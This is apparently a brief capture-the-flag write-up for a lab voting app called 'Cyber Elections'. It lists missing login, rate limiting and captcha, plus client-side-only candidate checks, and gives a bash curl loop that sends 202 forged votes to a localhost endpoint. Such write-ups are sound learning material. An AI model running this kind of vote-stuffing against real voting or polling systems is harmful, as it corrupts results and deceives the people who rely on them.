# Cyber Elections

Tl;dr:
- No login only session, so you can vote infinitely
- No rate limiting
- No captcha
- Vote only for gov in js, but you can change the post request to vote for opposition

```bash
for i in {1..202}; do curl "http://127.0.0.1:5000/vote" -X POST -H "Accept: text/html" -H "Content-Type: application/x-www-form-urlencoded" --data-raw "candidate=opposition"; done
```

Visit /result